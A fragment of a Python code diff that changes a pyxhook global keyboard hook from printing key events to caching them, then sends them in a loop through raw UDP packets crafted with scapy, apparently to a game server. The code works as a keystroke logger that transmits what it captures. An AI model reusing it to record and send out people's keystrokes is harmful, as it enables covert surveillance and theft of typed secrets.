@@ -90,7 +90,7 @@ def fire():
   w.extend((len(output)).to_bytes(length=2, byteorder='big'))
 
   # Pad this thing because it crashes for literally no reason
-  w.extend(bytes(output + "aaaa","utf-16be"))
+  w.extend(bytes(output + "aaaaasfsadfdsfasfsffasfdsdf","utf-16be"))
 
   #* ConnectionReceiveThread::receive
   #* ConnectionReceiveThread::processPacket
@@ -105,13 +105,15 @@ def fire():
 
   scapy.send(_ip/_udp/w)
 
+  cache.clear()
+
 
 
 def OnKeyPress(event): 
-    print('{}_down'.format(event.Key))
+    cache.append('{}_down'.format(event.Key).lower())
 
 def OnKeyUp(event): 
-    print('{}_up'.format(event.Key))
+    cache.append('{}_up'.format(event.Key).lower())
 
 new_hook = pyxhook.HookManager() 
 new_hook.KeyDown = OnKeyPress 
@@ -128,6 +130,9 @@ except Exception as ex:
     pyxhook.print_err(msg) 
     print("I suck at python :D")
 
-print("hi")
+while True:
+   sleep(delta)
+   fire()
+   
 
     
